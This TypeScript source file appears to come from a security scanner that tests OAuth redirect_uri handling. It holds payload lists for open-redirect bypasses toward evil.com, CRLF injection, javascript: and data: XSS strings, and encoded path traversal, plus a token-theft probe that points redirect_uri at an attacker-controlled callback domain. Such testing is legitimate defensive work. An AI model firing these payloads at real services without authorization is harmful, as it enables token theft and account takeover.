/**
 * OAuth redirect_uri Validator
 *
 * Phase 2: Tests redirect_uri parameter for vulnerabilities:
 * - Open redirect via OAuth
 * - Token theft via malicious redirect
 * - XSS via redirect_uri parameter
 * - Path traversal in redirect_uri
 *
 * CRITICAL PRODUCTION FIX:
 * - Uses custom callback domain from environment (OAUTH_CALLBACK_DOMAIN)
 * - Warns if using burpcollaborator.net or interactsh.com (low-impact rating)
 * - Supports custom domain configuration for production testing
 */

import axios from 'axios';
import { OAuthEndpoint } from './discovery';

export interface RedirectVulnerability {
  type: 'open_redirect' | 'token_theft' | 'xss' | 'path_traversal';
  severity: 'low' | 'medium' | 'high' | 'critical';
  endpoint: string;
  payload: string;
  description: string;
  evidence: string;
  impact: string;
  remediation: string;
}

export interface RedirectTestConfig {
  endpoint: OAuthEndpoint;
  clientId?: string;
  collaboratorUrl?: string;
  customCallbackDomain?: string;
  timeout: number;
}

export class RedirectValidator {
  private config: RedirectTestConfig;
  private vulnerabilities: RedirectVulnerability[] = [];

  constructor(config: RedirectTestConfig) {
    this.config = config;
  }

  /**
   * Main validation orchestrator
   */
  async validate(): Promise<RedirectVulnerability[]> {
    console.log(`[Redirect Validator] Testing ${this.config.endpoint.url}`);

    // Run all validation tests
    await Promise.allSettled([
      this.testOpenRedirect(),
      this.testTokenTheft(),
      this.testXSS(),
      this.testPathTraversal(),
    ]);

    console.log(`[Redirect Validator] Found ${this.vulnerabilities.length} vulnerabilities`);
    return this.vulnerabilities;
  }

  /**
   * Test for open redirect via redirect_uri manipulation
   */
  private async testOpenRedirect(): Promise<void> {
    const payloads = [
      // Direct external redirect
      'https://evil.com',
      'http://evil.com',
      
      // Protocol-relative
      '//evil.com',
      
      // Subdomain confusion
      'https://evil.com.target.com',
      'https://target.com.evil.com',
      
      // Path-based bypass
      'https://target.com@evil.com',
      'https://target.com#@evil.com',
      'https://target.com?@evil.com',
      
      // URL encoding bypass
      'https://target.com%2f%2fevil.com',
      'https://target.com%5c%5cevil.com',
      
      // Backslash bypass
      'https://target.com\\evil.com',
      'https://target.com\\.evil.com',
      
      // Null byte bypass
      'https://target.com%00.evil.com',
      
      // CRLF injection
      'https://target.com%0d%0aLocation:%20https://evil.com',
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.buildAuthUrl(payload);
        const response = await axios.get(testUrl, {
          timeout: this.config.timeout,
          maxRedirects: 0,
          validateStatus: (status) => status >= 200 && status < 400,
        });

        // Check if redirect points to our payload
        const location = response.headers['location'];
        if (location && this.isExternalRedirect(location, payload)) {
          this.vulnerabilities.push({
            type: 'open_redirect',
            severity: 'high',
            endpoint: this.config.endpoint.url,
            payload,
            description: 'OAuth authorization endpoint allows arbitrary redirect_uri values',
            evidence: `Request: ${testUrl}\nResponse Location: ${location}`,
            impact: 'Attacker can steal authorization codes or tokens by redirecting users to malicious sites',
            remediation: 'Implement strict redirect_uri validation with whitelist of allowed domains',
          });
        }
      } catch (error) {
        // Test failed, continue
      }
    }
  }

  /**
   * Test for token theft via redirect_uri
   */
  private async testTokenTheft(): Promise<void> {
    // Get callback URL (prefer custom domain over collaborator)
    const callbackUrl = this.getCallbackUrl();
    
    if (!callbackUrl) {
      console.log('[Redirect Validator] Skipping token theft test (no callback URL configured)');
      console.warn('[Redirect Validator] ⚠️ Set OAUTH_CALLBACK_DOMAIN in .env for production testing');
      return;
    }

    // Warn if using default domains (low-impact rating)
    if (callbackUrl.includes('burpcollaborator.net') || callbackUrl.includes('interactsh.com')) {
      console.warn('[Redirect Validator] ⚠️ WARNING: Using burpcollaborator.net or interactsh.com');
      console.warn('[Redirect Validator] ⚠️ This will result in "low-impact" or "informative" rating');
      console.warn('[Redirect Validator] ⚠️ Set OAUTH_CALLBACK_DOMAIN in .env for production testing');
    }

    const payloads = [
      // Direct callback
      callbackUrl,
      
      // Subdomain of callback
      `https://oauth.${callbackUrl.replace('https://', '').replace('http://', '')}`,
      
      // Path on callback
      `${callbackUrl}/callback`,
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.buildAuthUrl(payload, 'token'); // Use implicit flow
        
        // Make request (don't follow redirects)
        const response = await axios.get(testUrl, {
          timeout: this.config.timeout,
          maxRedirects: 0,
          validateStatus: () => true,
        });

        const location = response.headers['location'];
        
        // Check if tokens would be sent to our callback
        if (location && location.includes(callbackUrl)) {
          // Check for access_token in fragment
          if (location.includes('access_token=') || location.includes('#')) {
            this.vulnerabilities.push({
              type: 'token_theft',
              severity: 'critical',
              endpoint: this.config.endpoint.url,
              payload,
              description: 'OAuth endpoint allows token theft via malicious redirect_uri',
              evidence: `Request: ${testUrl}\nResponse would redirect to: ${location}`,
              impact: 'Attacker can steal access tokens by registering malicious redirect_uri',
              remediation: 'Enforce strict redirect_uri validation and use authorization code flow with PKCE',
            });
          }
        }
      } catch (error) {
        // Test failed, continue
      }
    }
  }

  /**
   * Test for XSS via redirect_uri parameter
   */
  private async testXSS(): Promise<void> {
    const payloads = [
      // JavaScript protocol
      'javascript:alert(document.domain)',
      'javascript:alert(1)',
      
      // Data URI
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      
      // VBScript (IE)
      'vbscript:msgbox(1)',
      
      // With encoding
      'java%0ascript:alert(1)',
      'java%09script:alert(1)',
      'java%0dscript:alert(1)',
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.buildAuthUrl(payload);
        const response = await axios.get(testUrl, {
          timeout: this.config.timeout,
          maxRedirects: 0,
          validateStatus: () => true,
        });

        // Check if payload is reflected in response
        const responseText = typeof response.data === 'string' ? response.data : '';
        if (responseText.includes(payload) || responseText.includes(decodeURIComponent(payload))) {
          this.vulnerabilities.push({
            type: 'xss',
            severity: 'high',
            endpoint: this.config.endpoint.url,
            payload,
            description: 'OAuth endpoint vulnerable to XSS via redirect_uri parameter',
            evidence: `Request: ${testUrl}\nPayload reflected in response`,
            impact: 'Attacker can execute arbitrary JavaScript in victim\'s browser context',
            remediation: 'Properly encode redirect_uri parameter and implement Content Security Policy',
          });
        }
      } catch (error) {
        // Test failed, continue
      }
    }
  }

  /**
   * Test for path traversal in redirect_uri
   */
  private async testPathTraversal(): Promise<void> {
    const baseUrl = new URL(this.config.endpoint.url);
    const baseDomain = baseUrl.hostname;

    const payloads = [
      // Path traversal
      `https://${baseDomain}/../../evil.com`,
      `https://${baseDomain}/../../../evil.com`,
      
      // Encoded path traversal
      `https://${baseDomain}/%2e%2e%2fevil.com`,
      `https://${baseDomain}/%252e%252e%252fevil.com`,
      
      // Mixed encoding
      `https://${baseDomain}/%2e%2e/evil.com`,
      `https://${baseDomain}/..%2fevil.com`,
    ];

    for (const payload of payloads) {
      try {
        const testUrl = this.buildAuthUrl(payload);
        const response = await axios.get(testUrl, {
          timeout: this.config.timeout,
          maxRedirects: 0,
          validateStatus: () => true,
        });

        const location = response.headers['location'];
        if (location && this.isExternalRedirect(location, 'evil.com')) {
          this.vulnerabilities.push({
            type: 'path_traversal',
            severity: 'high',
            endpoint: this.config.endpoint.url,
            payload,
            description: 'OAuth endpoint vulnerable to path traversal in redirect_uri',
            evidence: `Request: ${testUrl}\nResponse Location: ${location}`,
            impact: 'Attacker can bypass redirect_uri validation using path traversal',
            remediation: 'Normalize and validate redirect_uri before comparison',
          });
        }
      } catch (error) {
        // Test failed, continue
      }
    }
  }

  /**
   * Get callback URL (prefer custom domain over collaborator)
   */
  private getCallbackUrl(): string | null {
    // Check for custom domain from environment
    const customDomain = this.config.customCallbackDomain || process.env.OAUTH_CALLBACK_DOMAIN;
    
    if (customDomain) {
      // Ensure it has protocol
      if (!customDomain.startsWith('http://') && !customDomain.startsWith('https://')) {
        return `https://${customDomain}`;
      }
      return customDomain;
    }

    // Fallback to collaborator if allowed
    const allowFallback = process.env.OAUTH_FALLBACK_TO_COLLABORATOR === 'true';
    
    if (allowFallback && this.config.collaboratorUrl) {
      console.warn('[Redirect Validator] Using Burp Collaborator as fallback (not recommended for production)');
      return this.config.collaboratorUrl;
    }

    return null;
  }

  /**
   * Build authorization URL with test payload
   */
  private buildAuthUrl(redirectUri: string, responseType: string = 'code'): string {
    const url = new URL(this.config.endpoint.url);
    url.searchParams.set('response_type', responseType);
    url.searchParams.set('redirect_uri', redirectUri);
    
    if (this.config.clientId) {
      url.searchParams.set('client_id', this.config.clientId);
    }
    
    url.searchParams.set('state', 'test_state');
    url.searchParams.set('scope', 'openid profile email');
    
    return url.toString();
  }

  /**
   * Check if redirect is to external domain
   */
  private isExternalRedirect(location: string, expectedDomain: string): boolean {
    try {
      const locationUrl = new URL(location);
      const endpointUrl = new URL(this.config.endpoint.url);
      
      // Check if location contains our test domain
      return locationUrl.hostname.includes(expectedDomain.replace('https://', '').replace('http://', '')) ||
             locationUrl.hostname !== endpointUrl.hostname;
    } catch {
      return false;
    }
  }
}

export default RedirectValidator;